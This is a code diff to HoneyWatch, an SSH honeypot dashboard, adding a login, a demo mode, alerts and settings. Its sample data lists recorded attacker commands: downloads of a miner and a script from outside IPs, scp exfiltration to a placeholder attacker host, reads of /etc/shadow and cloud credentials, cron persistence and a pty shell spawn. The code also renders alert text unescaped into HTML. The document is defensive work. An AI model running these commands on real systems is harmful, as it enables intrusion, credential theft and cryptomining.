+  // ── Find server ──────────────────────────────────────────────────────────
+  var port = await discoverApiPort();
+
+  // ── No server — only enter demo if explicitly using demo creds ───────────
+  if (!port) {
+    var isDemoCreds = (user === 'admin' && pass === 'honeywatch') || (user === 'demo' && pass === 'demo');
+    if (isDemoCreds) {
+      enterDemoMode();
+      return;
+    }
+    err.innerHTML =
+      '<span style="color:var(--r)">Cannot reach ws_server.py.</span><br>' +
+      '<span style="color:var(--txt2)">Check it is running, then retry.<br>' +
+      'Or use <b style="color:var(--g)">admin / honeywatch</b> for offline demo.</span>';
+    btn.disabled = false;
+    btn.textContent = 'AUTHENTICATE';
+    return;
+  }
+
+  // ── Server found — log in ────────────────────────────────────────────────
+  btn.textContent = 'AUTHENTICATING...';
   try {
-    const r = await fetch('http://localhost:8080/api/stats',
-      {signal:AbortSignal.timeout(3000)});
-    _data = await r.json();
-    renderAll(_data);
-  } catch {
-    if (!_data) { _data = DEMO_DATA; renderAll(_data); }
+    var loginUrl = 'http://localhost:' + port + '/api/login';
+    var r = await fetch(loginUrl, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({username: user, password: pass}),
+      signal: AbortSignal.timeout(8000),
+    });
+    var data = await r.json();
+    if (!r.ok) {
+      err.textContent = data.error || 'Invalid credentials';
+      btn.disabled = false;
+      btn.textContent = 'AUTHENTICATE';
+      return;
+    }
+    // ── Success ──────────────────────────────────────────────────────────
+    _token = data.token;
+    _apiPort = port;
+    sessionStorage.setItem('hw_token', _token);
+    sessionStorage.setItem('hw_user',  data.username);
+    document.getElementById('login-overlay').classList.add('hidden');
+    showLoggedIn(data.username + ' (live)');
+    connectWS(port, _token);
+    loadData();
+    loadAlerts();
+  } catch(e) {
+    err.textContent = 'Error: ' + (e.message || 'timeout');
+    btn.disabled = false;
+    btn.textContent = 'AUTHENTICATE';
   }
 }
 
-// ══════════════════════════════════════════════════════ DEMO DATA ══
-const DEMO_DATA = {"summary":{"total_attempts":8660,"total_successes":765,"unique_ips":15,"total_commands":3912,"suspicious_events":889,"malware_captures":253,"active_sessions":3,"sessions_today":47,"success_rate":8.8},"timeline":[{"date":"2026-04-18","attempts":389,"successes":30,"commands":152},{"date":"2026-04-19","attempts":786,"successes":73,"commands":396},{"date":"2026-04-20","attempts":915,"successes":83,"commands":441},{"date":"2026-04-21","attempts":364,"successes":40,"commands":204},{"date":"2026-04-22","attempts":248,"successes":24,"commands":163},{"date":"2026-04-23","attempts":505,"successes":50,"commands":172},{"date":"2026-04-24","attempts":570,"successes":32,"commands":242},{"date":"2026-04-25","attempts":461,"successes":44,"commands":232},{"date":"2026-04-26","attempts":910,"successes":81,"commands":416},{"date":"2026-04-27","attempts":743,"successes":72,"commands":322},{"date":"2026-04-28","attempts":580,"successes":48,"commands":282},{"date":"2026-04-29","attempts":579,"successes":47,"commands":287},{"date":"2026-04-30","attempts":778,"successes":78,"commands":314},{"date":"2026-05-01","attempts":173,"successes":15,"commands":67}],"top_usernames":[{"value":"guest","count":412},{"value":"test","count":404},{"value":"jenkins","count":397},{"value":"ec2-user","count":396},{"value":"ansible","count":393},{"value":"hadoop","count":393},{"value":"user","count":393},{"value":"oracle","count":391},{"value":"pi","count":381},{"value":"support","count":379},{"value":"ftp","count":372},{"value":"mysql","count":370}],"top_passwords":[{"value":"raspberry","count":353},{"value":"dragon","count":349},{"value":"1234","count":347},{"value":"test","count":346},{"value":"batman","count":339},{"value":"letmein","count":334},{"value":"changeme","count":330},{"value":"admin","count":329},{"value":"root123","count":329},{"value":"default","count":328},{"value":"password","count":326},{"value":"master","count":325}],"top_ips":[{"ip":"194.165.16.75","count":703,"country":"Iran","country_code":"IR","city":"Tehran","isp":"Erfan Net","lat":35.69,"lon":51.42,"abuse_score":82},{"ip":"80.94.92.241","count":684,"country":"Ukraine","country_code":"UA","city":"Kyiv","isp":"Volia","lat":50.45,"lon":30.52,"abuse_score":85},{"ip":"45.33.32.156","count":668,"country":"United States","country_code":"US","city":"Atlanta","isp":"Linode LLC","lat":33.74,"lon":-84.38,"abuse_score":72},{"ip":"77.83.36.55","count":663,"country":"Netherlands","country_code":"NL","city":"Breda","isp":"Verdant BV","lat":51.59,"lon":4.78,"abuse_score":67},{"ip":"178.128.23.9","count":638,"country":"Singapore","country_code":"SG","city":"Singapore","isp":"DigitalOcean","lat":1.29,"lon":103.85,"abuse_score":44},{"ip":"52.87.193.204","count":637,"country":"United States","country_code":"US","city":"Ashburn","isp":"Amazon AWS","lat":39.04,"lon":-77.49,"abuse_score":20},{"ip":"91.213.50.8","count":631,"country":"Bulgaria","country_code":"BG","city":"Sofia","isp":"Neterra Ltd","lat":42.69,"lon":23.32,"abuse_score":76},{"ip":"185.234.219.20","count":596,"country":"Russia","country_code":"RU","city":"Moscow","isp":"Hosting Ltd","lat":55.75,"lon":37.62,"abuse_score":98},{"ip":"109.248.9.14","count":567,"country":"China","country_code":"CN","city":"Beijing","isp":"Alibaba Cloud","lat":39.91,"lon":116.39,"abuse_score":79},{"ip":"146.185.133.197","count":554,"country":"Romania","country_code":"RO","city":"Bucharest","isp":"M247 Ltd","lat":44.43,"lon":26.1,"abuse_score":88}],"attack_types":[{"type":"dictionary_attack","count":3552},{"type":"targeted_bruteforce","count":2218},{"type":"bruteforce","count":1578},{"type":"credential_stuffing","count":1312}],"top_commands":[{"cmd":"cat","count":778},{"cmd":"ls","count":161},{"cmd":"free","count":141},{"cmd":"scp","count":138},{"cmd":"ifconfig","count":138},{"cmd":"grep","count":138},{"cmd":"whoami","count":136},{"cmd":"python3","count":135},{"cmd":"netstat","count":135},{"cmd":"uname","count":134},{"cmd":"env","count":133},{"cmd":"wget","count":132}],"recent_commands":[{"timestamp":"2026-05-01T05:38:55+00:00","peer_ip":"5.188.86.172","command":"chmod +x /tmp/x.sh"},{"timestamp":"2026-05-01T05:35:43+00:00","peer_ip":"5.188.86.172","command":"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root"},{"timestamp":"2026-05-01T05:34:03+00:00","peer_ip":"5.188.86.172","command":"cat /root/.env"},{"timestamp":"2026-05-01T05:33:43+00:00","peer_ip":"5.188.86.172","command":"cat /etc/shadow"},{"timestamp":"2026-05-01T04:01:54+00:00","peer_ip":"109.248.9.14","command":"ps aux"},{"timestamp":"2026-05-01T03:59:42+00:00","peer_ip":"109.248.9.14","command":"cat /root/.env"},{"timestamp":"2026-05-01T03:56:25+00:00","peer_ip":"109.248.9.14","command":"/tmp/x.sh"},{"timestamp":"2026-05-01T03:55:56+00:00","peer_ip":"109.248.9.14","command":"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/"},{"timestamp":"2026-05-01T03:55:46+00:00","peer_ip":"109.248.9.14","command":"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root"},{"timestamp":"2026-05-01T03:55:11+00:00","peer_ip":"109.248.9.14","command":"cat /etc/shadow"},{"timestamp":"2026-05-01T03:54:56+00:00","peer_ip":"109.248.9.14","command":"uname -a"},{"timestamp":"2026-05-01T03:47:57+00:00","peer_ip":"91.213.50.8","command":"cat /root/.aws/credentials"},{"timestamp":"2026-05-01T03:47:29+00:00","peer_ip":"91.213.50.8","command":"ls -la"},{"timestamp":"2026-05-01T02:54:38+00:00","peer_ip":"80.94.92.241","command":"ssh root@10.0.1.100"},{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","command":"curl http://193.106.31.72/miner -o /tmp/miner"},{"timestamp":"2026-05-01T02:53:49+00:00","peer_ip":"80.94.92.241","command":"cat /root/.aws/credentials"}],"suspicious_types":[{"type":"file_download","count":253},{"type":"data_exfiltration","count":138},{"type":"interpreter_execution","count":135},{"type":"persistence","count":126},{"type":"make_executable","count":120},{"type":"lateral_movement","count":117}],"recent_suspicious":[{"timestamp":"2026-05-01T05:38:55+00:00","peer_ip":"5.188.86.172","suspicious_type":"make_executable","detail":"{\"command\":\"chmod +x /tmp/x.sh\"}","severity":"medium","country":"Russia","country_code":"RU"},{"timestamp":"2026-05-01T05:35:43+00:00","peer_ip":"5.188.86.172","suspicious_type":"persistence","detail":"{\"command\":\"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root\"}","severity":"critical","country":"Russia","country_code":"RU"},{"timestamp":"2026-05-01T03:55:56+00:00","peer_ip":"109.248.9.14","suspicious_type":"data_exfiltration","detail":"{\"command\":\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\"}","severity":"critical","country":"China","country_code":"CN"},{"timestamp":"2026-05-01T03:55:46+00:00","peer_ip":"109.248.9.14","suspicious_type":"persistence","detail":"{\"command\":\"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root\"}","severity":"critical","country":"China","country_code":"CN"},{"timestamp":"2026-05-01T03:48:37+00:00","peer_ip":"91.213.50.8","suspicious_type":"data_exfiltration","detail":"{\"command\":\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\"}","severity":"critical","country":"Bulgaria","country_code":"BG"},{"timestamp":"2026-05-01T02:54:38+00:00","peer_ip":"80.94.92.241","suspicious_type":"lateral_movement","detail":"{\"command\":\"ssh root@10.0.1.100\"}","severity":"critical","country":"Ukraine","country_code":"UA"},{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","suspicious_type":"file_download","detail":"{\"command\":\"curl http://193.106.31.72/miner -o /tmp/miner\"}","severity":"high","country":"Ukraine","country_code":"UA"},{"timestamp":"2026-05-01T01:29:39+00:00","peer_ip":"146.185.133.197","suspicious_type":"lateral_movement","detail":"{\"command\":\"ssh root@10.0.1.100\"}","severity":"critical","country":"Romania","country_code":"RO"},{"timestamp":"2026-05-01T01:25:59+00:00","peer_ip":"146.185.133.197","suspicious_type":"file_download","detail":"{\"command\":\"wget http://45.33.32.156/x.sh -O /tmp/x.sh\"}","severity":"high","country":"Romania","country_code":"RO"},{"timestamp":"2026-05-01T01:20:57+00:00","peer_ip":"146.185.133.197","suspicious_type":"interpreter_execution","detail":"{\"command\":\"python3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\"}","severity":"high","country":"Romania","country_code":"RO"}],"map_points":[{"ip":"104.236.198.48","lat":37.77,"lon":-122.41,"country":"United States","country_code":"US","city":"San Francisco","isp":"DigitalOcean","abuse_score":55,"attempts":516},{"ip":"109.248.9.14","lat":39.91,"lon":116.39,"country":"China","country_code":"CN","city":"Beijing","isp":"Alibaba Cloud","abuse_score":79,"attempts":567},{"ip":"138.197.148.152","lat":50.11,"lon":8.68,"country":"Germany","country_code":"DE","city":"Frankfurt","isp":"DigitalOcean","abuse_score":60,"attempts":476},{"ip":"146.185.133.197","lat":44.43,"lon":26.1,"country":"Romania","country_code":"RO","city":"Bucharest","isp":"M247 Ltd","abuse_score":88,"attempts":554},{"ip":"178.128.23.9","lat":1.29,"lon":103.85,"country":"Singapore","country_code":"SG","city":"Singapore","isp":"DigitalOcean","abuse_score":44,"attempts":638},{"ip":"185.234.219.20","lat":55.75,"lon":37.62,"country":"Russia","country_code":"RU","city":"Moscow","isp":"Hosting Ltd","abuse_score":98,"attempts":596},{"ip":"193.106.31.72","lat":52.37,"lon":4.9,"country":"Netherlands","country_code":"NL","city":"Amsterdam","isp":"Serverius","abuse_score":91,"attempts":429},{"ip":"194.165.16.75","lat":35.69,"lon":51.42,"country":"Iran","country_code":"IR","city":"Tehran","isp":"Erfan Net","abuse_score":82,"attempts":703},{"ip":"45.142.212.100","lat":41.01,"lon":28.95,"country":"Turkey","country_code":"TR","city":"Istanbul","isp":"Stark Industries","abuse_score":93,"attempts":445},{"ip":"45.33.32.156","lat":33.74,"lon":-84.38,"country":"United States","country_code":"US","city":"Atlanta","isp":"Linode LLC","abuse_score":72,"attempts":668},{"ip":"5.188.86.172","lat":59.93,"lon":30.32,"country":"Russia","country_code":"RU","city":"St Petersburg","isp":"Pin-Up LLC","abuse_score":95,"attempts":453},{"ip":"52.87.193.204","lat":39.04,"lon":-77.49,"country":"United States","country_code":"US","city":"Ashburn","isp":"Amazon AWS","abuse_score":20,"attempts":637},{"ip":"77.83.36.55","lat":51.59,"lon":4.78,"country":"Netherlands","country_code":"NL","city":"Breda","isp":"Verdant BV","abuse_score":67,"attempts":663},{"ip":"80.94.92.241","lat":50.45,"lon":30.52,"country":"Ukraine","country_code":"UA","city":"Kyiv","isp":"Volia","abuse_score":85,"attempts":684},{"ip":"91.213.50.8","lat":42.69,"lon":23.32,"country":"Bulgaria","country_code":"BG","city":"Sofia","isp":"Neterra Ltd","abuse_score":76,"attempts":631}],"hourly_heatmap":[{"hour":0,"count":341},{"hour":1,"count":437},{"hour":2,"count":420},{"hour":3,"count":396},{"hour":4,"count":265},{"hour":5,"count":188},{"hour":6,"count":152},{"hour":7,"count":262},{"hour":8,"count":305},{"hour":9,"count":451},{"hour":10,"count":408},{"hour":11,"count":366},{"hour":12,"count":471},{"hour":13,"count":462},{"hour":14,"count":325},{"hour":15,"count":349},{"hour":16,"count":453},{"hour":17,"count":433},{"hour":18,"count":564},{"hour":19,"count":400},{"hour":20,"count":326},{"hour":21,"count":410},{"hour":22,"count":182},{"hour":23,"count":294}],"recent_malware":[{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","url":"http://193.106.31.72/miner","tool":"curl","filename":"miner","file_hash":"sha256:9699e7f36afd2e74"},{"timestamp":"2026-05-01T02:20:18+00:00","peer_ip":"52.87.193.204","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:d0ea34c89ac60c25"},{"timestamp":"2026-05-01T01:25:59+00:00","peer_ip":"146.185.133.197","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:52216b515196fa83"},{"timestamp":"2026-04-30T23:50:47+00:00","peer_ip":"45.142.212.100","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:6908ba7358651a4e"},{"timestamp":"2026-04-30T21:12:19+00:00","peer_ip":"194.165.16.75","url":"http://193.106.31.72/miner","tool":"curl","filename":"miner","file_hash":"sha256:d4d0b18a56a584ed"},{"timestamp":"2026-04-30T18:45:57+00:00","peer_ip":"109.248.9.14","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:33b57b6b338ce0ef"}]};
+function enterDemoMode() {
+  _token = 'demo';
+  _apiPort = null;
+  sessionStorage.setItem('hw_token', 'demo');
+  sessionStorage.setItem('hw_user',  'demo');
+  document.getElementById('login-overlay').classList.add('hidden');
+  showLoggedIn('demo (offline)');
+  // Show demo banner
+  var banner = document.createElement('div');
+  banner.style.cssText = 'position:fixed;top:56px;left:0;right:0;z-index:400;' +
+    'background:rgba(255,204,0,.12);border-bottom:1px solid rgba(255,204,0,.3);' +
+    'padding:6px;text-align:center;font-family:var(--font-mono);font-size:10px;color:var(--y);';
+  banner.textContent = '⚠ DEMO MODE — showing sample data. Start ws_server.py for live data.';
+  document.body.insertBefore(banner, document.body.children[1]);
+  // Load demo data
+  _data = DEMO_DATA;
+  renderAll(_data);
+}
 
-// ══════════════════════════════════════════════════════ INIT ══
-loadData();
-connectWS();
-setInterval(loadData, 30000);
+function showLoggedIn(username) {
+  document.getElementById('admin-bar').style.display = 'flex';
+  document.getElementById('admin-user').textContent = username;
+}
+
+function doLogout() {
+  _token = null;
+  sessionStorage.removeItem('hw_token');
+  sessionStorage.removeItem('hw_user');
+  document.getElementById('admin-bar').style.display = 'none';
+  document.getElementById('login-overlay').classList.remove('hidden');
+  document.getElementById('login-pass').value = '';
+  document.getElementById('login-err').textContent = '';
+}
+
+// Enter key on login form
+document.getElementById('login-pass').addEventListener('keydown', e => {
+  if (e.key === 'Enter') doLogin();
+});
+document.getElementById('login-user').addEventListener('keydown', e => {
+  if (e.key === 'Enter') document.getElementById('login-pass').focus();
+});
+
+// ══════════════════════════════════════════════════════ WS AUTH ══
+function connectWS(port, token) {
+  const wsEl = document.getElementById('ws-status');
+  if (!port || !token) return;
+  _apiPort = port;
+  try {
+    var wsUrl = 'ws://localhost:' + port + '/ws?token=' + encodeURIComponent(token);
+    const ws = new WebSocket(wsUrl);
+    ws.onopen = () => { wsEl.textContent = '● LIVE :'+port; wsEl.classList.add('connected'); };
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'snapshot') { _data = msg.data; renderAll(_data); }
+      else { pushFeedEvent(msg); }
+    };
+    ws.onclose = () => {
+      wsEl.textContent = '● OFFLINE'; wsEl.classList.remove('connected');
+      setTimeout(() => { if (_token) connectWS(port, _token); }, 4000);
+    };
+    ws.onerror = () => ws.close();
+  } catch(e) {}
+}
+
+// ══════════════════════════════════════════════════════ LOAD AUTH ══
+async function loadData() {
+  if (!_token) return;
+  if (_token === 'demo') { if (!_data) _data = DEMO_DATA; renderAll(_data); return; }
+  if (!_apiPort) return;
+  try {
+    var r = await fetch('http://localhost:' + _apiPort + '/api/stats',
+      {headers: authHeaders(), signal: AbortSignal.timeout(8000)});
+    if (r.status === 401) { doLogout(); return; }
+    _data = await r.json();
+    renderAll(_data);
+    // Update live badge
+    var wsEl = document.getElementById('ws-status');
+    if (wsEl && !wsEl.classList.contains('connected')) {
+      wsEl.textContent = '● POLLING'; wsEl.style.color = 'var(--y)';
+    }
+  } catch(e) { console.warn('loadData failed:', e.message); }
+}
+
+// ══════════════════════════════════════════════════════ PDF REPORT ══
+async function downloadReport() {
+  const btn = document.querySelector('.admin-btn.report');
+  btn.textContent = '⏳ GENERATING...';
+  btn.disabled = true;
+  try {
+    const r = await fetch(apiUrl('/api/report?days=14&format=pdf'),
+      {headers: authHeaders(), signal: AbortSignal.timeout(30000)});
+    if (!r.ok) { alert('Report generation failed: ' + await r.text()); return; }
+    const blob = await r.blob();
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href = url;
+    a.download = 'honeywatch_report_' + new Date().toISOString().slice(0,10) + '.pdf';
+    document.body.appendChild(a); a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    alert('Download failed: ' + e.message);
+  } finally {
+    btn.textContent = '⬇ PDF REPORT';
+    btn.disabled = false;
+  }
+}
+
+// ══════════════════════════════════════════════════════ ALERTS ══
+async function loadAlerts() {
+  if (!_token || _token === 'demo' || !_apiPort) return;
+  try {
+    var r = await fetch('http://localhost:' + _apiPort + '/api/alerts',
+      {headers: authHeaders(), signal: AbortSignal.timeout(5000)});
+    if (!r.ok) return;
+    var data = await r.json();
+    renderAlerts(data.alerts || []);
+  } catch(e) { console.warn('loadAlerts failed:', e.message); }
+}
+
+function renderAlerts(alerts) {
+  if (!alerts) return;
+  const unacked  = alerts.filter(a => !a.acknowledged).length;
+  const critical = alerts.filter(a => a.severity === 'critical').length;
+  const high     = alerts.filter(a => a.severity === 'high').length;
+
+  const badge = document.getElementById('nav-alert-badge');
+  if (unacked > 0) { badge.style.display = 'inline-flex'; badge.textContent = unacked; }
+  else             { badge.style.display = 'none'; }
+
+  const setTxt = (id, v) => { const el = document.getElementById(id); if(el) el.textContent = v; };
+  setTxt('al-unacked',  unacked);
+  setTxt('al-critical', critical);
+  setTxt('al-high',     high);
+  setTxt('al-total',    alerts.length);
+  const tag = document.getElementById('alerts-tag');
+  if (tag) tag.textContent = alerts.length + ' total';
+
+  const el = document.getElementById('alertsList');
+  if (!el) return;
+  if (!alerts.length) {
+    el.innerHTML = '<div style="font-family:var(--font-mono);font-size:12px;color:var(--txt2);padding:20px;text-align:center">No alerts yet. The spike monitor checks every 60 seconds.</div>';
+    return;
+  }
+  el.innerHTML = alerts.map(a => {
+    let det = '';
+    try { const d = JSON.parse(a.details||'{}'); det = Object.entries(d).map(([k,v]) => k+': '+v).join(' · '); } catch {}
+    return '<div class="alert-item ' + a.severity + (a.acknowledged?' acked':'') + '" id="alert-'+a.id+'">' +
+      '<span class="chip sev-'+a.severity+'">'+a.severity.toUpperCase()+'</span>' +
+      '<div><div class="alert-title">'+a.title+'</div><div class="alert-msg">'+a.message+(det?' — '+det.slice(0,80):'')+'</div></div>' +
+      '<span class="alert-ts">'+fmtTs(a.timestamp)+'</span>' +
+      (a.acknowledged ? '<span style="font-family:var(--font-mono);font-size:9px;color:var(--txt2)">ACK</span>' :
+       '<button class="ack-btn" onclick="ackAlert('+a.id+')">ACK</button>') +
+      '</div>';
+  }).join('');
+}
+
+async function ackAlert(id) {
+  try {
+    await fetch(apiUrl('/api/alerts/'+id+'/ack'),
+      {method:'POST', headers: authHeaders()});
+    const el = document.getElementById('alert-'+id);
+    if (el) el.classList.add('acked');
+    loadAlerts();
+  } catch {}
+}
+
+async function ackAllAlerts() {
+  const all = document.querySelectorAll('.alert-item:not(.acked)');
+  for (const el of all) {
+    const id = el.id.replace('alert-','');
+    try { await fetch(apiUrl('/api/alerts/'+id+'/ack'), {method:'POST', headers:authHeaders()}); } catch {}
+  }
+  loadAlerts();
+}
+
+// Also render alerts from snapshot data
+// _origRenderAll removed (unused)
+
+// ══════════════════════════════════════════════════════ SETTINGS ══
+function openSettings() {
+  if (!_token || !_apiPort) return;
+  fetch(apiUrl('/api/alert-config'), {headers: authHeaders()})
+    .then(r => r.json()).then(cfg => {
+      const set = (id, val) => { const el = document.getElementById(id); if(el) { if(el.type==='checkbox') el.checked=!!val; else el.value=val||''; } };
+      set('s-email',      cfg.email_enabled);
+      set('s-smtp-host',  cfg.smtp_host);
+      set('s-smtp-user',  cfg.smtp_user);
+      set('s-discord',    cfg.discord_enabled);
+      set('s-discord-url',cfg.discord_webhook);
+      set('s-slack',      cfg.slack_enabled);
+      set('s-slack-url',  cfg.slack_webhook);
+      set('s-spike',      cfg.spike_threshold);
+      document.getElementById('settings-msg').textContent = '';
+    }).catch(() => {});
+  document.getElementById('settings-modal').classList.remove('hidden');
+}
+
+function closeSettings() {
+  document.getElementById('settings-modal').classList.add('hidden');
+  _settingsPending = {};
+}
+
+function updateSettingsBool(key, val) { _settingsPending[key] = val; }
+function updateSettingsStr(key, val)  { _settingsPending[key] = val; }
+
+async function saveSettings() {
+  if (!Object.keys(_settingsPending).length) {
+    document.getElementById('settings-msg').textContent = 'No changes to save.'; return;
+  }
+  try {
+    const r = await fetch(apiUrl('/api/alert-config'), {
+      method:'POST', headers: authHeaders(),
+      body: JSON.stringify(_settingsPending),
+    });
+    const data = await r.json();
+    document.getElementById('settings-msg').textContent = data.ok ? '✓ Saved successfully' : ('Error: '+data.error);
+    _settingsPending = {};
+  } catch(e) {
+    document.getElementById('settings-msg').textContent = 'Save failed: '+e.message;
+  }
+}
+
+async function changePassword() {
+  const np = document.getElementById('s-newpass').value;
+  if (!np || np.length < 8) {
+    document.getElementById('settings-msg').textContent = 'Password must be at least 8 characters'; return;
+  }
+  try {
+    const r = await fetch(apiUrl('/api/passwd'), {
+      method:'POST', headers: authHeaders(),
+      body: JSON.stringify({new_password: np}),
+    });
+    const data = await r.json();
+    document.getElementById('settings-msg').textContent = data.ok ? '✓ Password changed. Please log in again.' : ('Error: '+data.error);
+    document.getElementById('s-newpass').value = '';
+    if (data.ok) setTimeout(doLogout, 2000);
+  } catch(e) {
+    document.getElementById('settings-msg').textContent = 'Failed: '+e.message;
+  }
+}
+
+// Patch showPage to also load alerts when navigating there
+// _origShowPage removed (unused)
+function showPage(name) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('page-'+name).classList.add('active');
+  event.target.classList.add('active');
+  if (name === 'map' && _map && _data) {
+    setTimeout(() => { _map.invalidateSize(); renderMap(_data); }, 100);
+  }
+  if (name === 'alerts') loadAlerts();
+}
+
+// ── Startup ─────────────────────────────────────────────────────────────────
+checkExistingSession();
+setInterval(loadData,   30000);
+setInterval(loadAlerts, 15000);
 </script>
+
+<!-- ═══════════════════════════ LOGIN OVERLAY ═══════════════════════════ -->
+<div id="login-overlay">
+  <div class="login-box">
+    <div style="font-size:36px;margin-bottom:12px">🍯</div>
+    <h2>HONEYWATCH</h2>
+    <p>SSH THREAT INTELLIGENCE PLATFORM</p>
+    <p style="font-size:9px;color:var(--txt2);margin-top:-12px;margin-bottom:16px">Start ws_server.py first &nbsp;|&nbsp; Demo: admin / honeywatch</p>
+    <input class="login-field" id="login-user" type="text"     placeholder="Username" autocomplete="username"/>
+    <input class="login-field" id="login-pass" type="password" placeholder="Password" autocomplete="current-password"/>
+    <button class="login-btn" id="login-btn" onclick="doLogin()">AUTHENTICATE</button>
+    <div class="login-err" id="login-err"></div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════ SETTINGS MODAL ══════════════════════════ -->
+<div id="settings-modal" class="hidden">
+  <div class="settings-box">
+    <h3>⚙ ALERT CONFIGURATION</h3>
+    <div class="settings-section">Email</div>
+    <div class="settings-row"><span class="settings-lbl">Enable Email</span>
+      <input class="settings-check" id="s-email" type="checkbox" onchange="updateSettingsBool('email_enabled',this.checked)"></div>
+    <div class="settings-row"><span class="settings-lbl">SMTP Host</span>
+      <input class="settings-inp" id="s-smtp-host" placeholder="smtp.gmail.com" onchange="updateSettingsStr('smtp_host',this.value)"></div>
+    <div class="settings-row"><span class="settings-lbl">SMTP User</span>
+      <input class="settings-inp" id="s-smtp-user" placeholder="you@gmail.com" onchange="updateSettingsStr('smtp_user',this.value)"></div>
+    <div class="settings-row"><span class="settings-lbl">Alert To (comma)</span>
+      <input class="settings-inp" id="s-alert-to" placeholder="admin@company.com" onchange="updateSettingsStr('alert_to_str',this.value)"></div>
+    <div class="settings-section">Discord / Slack</div>
+    <div class="settings-row"><span class="settings-lbl">Enable Discord</span>
+      <input class="settings-check" id="s-discord" type="checkbox" onchange="updateSettingsBool('discord_enabled',this.checked)"></div>
+    <div class="settings-row"><span class="settings-lbl">Discord Webhook</span>
+      <input class="settings-inp" id="s-discord-url" placeholder="https://discord.com/api/webhooks/..." onchange="updateSettingsStr('discord_webhook',this.value)"></div>
+    <div class="settings-row"><span class="settings-lbl">Enable Slack</span>
+      <input class="settings-check" id="s-slack" type="checkbox" onchange="updateSettingsBool('slack_enabled',this.checked)"></div>
+    <div class="settings-row"><span class="settings-lbl">Slack Webhook</span>
+      <input class="settings-inp" id="s-slack-url" placeholder="https://hooks.slack.com/..." onchange="updateSettingsStr('slack_webhook',this.value)"></div>
+    <div class="settings-section">Thresholds</div>
+    <div class="settings-row"><span class="settings-lbl">Spike Threshold</span>
+      <input class="settings-inp" id="s-spike" type="number" placeholder="50" onchange="updateSettingsStr('spike_threshold',parseInt(this.value))"></div>
+    <div class="settings-section">Change Password</div>
+    <div class="settings-row"><span class="settings-lbl">New Password</span>
+      <input class="settings-inp" id="s-newpass" type="password" placeholder="min 8 characters"></div>
+    <div>
+      <button class="settings-save" onclick="saveSettings()">SAVE CHANGES</button>
+      <button class="settings-save" onclick="changePassword()" style="background:rgba(0,204,255,.1);border-color:rgba(0,204,255,.3);color:var(--c)">CHANGE PASSWORD</button>
+      <button class="settings-close" onclick="closeSettings()">CLOSE</button>
+    </div>
+    <div id="settings-msg" style="font-family:var(--font-mono);font-size:10px;margin-top:8px;color:var(--g)"></div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════ ALERTS PAGE ═════════════════════════════ -->
+<div class="page" id="page-alerts">
+  <div class="stat-strip" style="grid-template-columns:repeat(4,1fr);max-width:700px">
+    <div class="stat r"><div class="stat-lbl">Unacknowledged</div><div class="stat-val" id="al-unacked">─</div><div class="stat-sub">need attention</div></div>
+    <div class="stat o"><div class="stat-lbl">Critical</div><div class="stat-val" id="al-critical">─</div><div class="stat-sub">severity</div></div>
+    <div class="stat y"><div class="stat-lbl">High</div><div class="stat-val" id="al-high">─</div><div class="stat-sub">severity</div></div>
+    <div class="stat g"><div class="stat-lbl">Total Alerts</div><div class="stat-val" id="al-total">─</div><div class="stat-sub">all time</div></div>
+  </div>
+  <div class="panel">
+    <div class="ph">
+      <span class="ph-title">🔔 Real-Time Alert Feed</span>
+      <div style="display:flex;gap:8px">
+        <span class="ph-tag" id="alerts-tag">─</span>
+        <button onclick="ackAllAlerts()" style="font-family:var(--font-mono);font-size:9px;padding:2px 10px;border-radius:3px;border:1px solid var(--border2);color:var(--txt2);background:transparent;cursor:pointer">ACK ALL</button>
+      </div>
+    </div>
+    <div class="pb" id="alertsList"><div class="loading"><div class="spin"></div></div></div>
+  </div>
+</div>
 </body>
 </html>
